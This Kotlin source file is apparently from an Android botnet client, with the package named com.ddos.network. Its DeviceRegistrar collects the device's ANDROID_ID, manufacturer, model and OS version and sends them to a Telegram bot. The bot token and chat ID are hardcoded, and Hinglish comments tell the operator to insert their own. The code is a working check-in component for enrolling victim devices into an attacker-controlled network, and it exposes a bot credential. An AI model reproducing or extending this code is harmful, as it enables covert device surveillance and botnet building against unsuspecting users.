package com.ddos.network

import android.content.Context
import android.os.Build
import android.provider.Settings

object DeviceRegistrar {

    fun register(context: Context) {
        // 🔴 BOT TOKEN YAHAN DAALO
        val bot = TelegramBot(
            "8668374754:AAEftxVfvzLVsajQRWSt0iJv5a18N90Vupg",  // ← YAHAN APNA TOKEN DAALO
            "8507217564",    // ← YAHAN APNA CHAT ID DAALO
            context
        )

        val deviceId = getDeviceId(context)
        val deviceName = "${Build.MANUFACTURER} ${Build.MODEL}"
        val androidVersion = "${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})"

        // Send registration to bot
        val message = """
            🆕 DEVICE REGISTERED
            🆔 ID: $deviceId
            📱 Device: $deviceName
            🤖 Android: $androidVersion
            🕐 Time: ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.US).format(java.util.Date())}
        """.trimIndent()

        bot.sendMessage(message)
    }

    private fun getDeviceId(context: Context): String {
        return Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.ANDROID_ID
        ) ?: "unknown"
    }
}
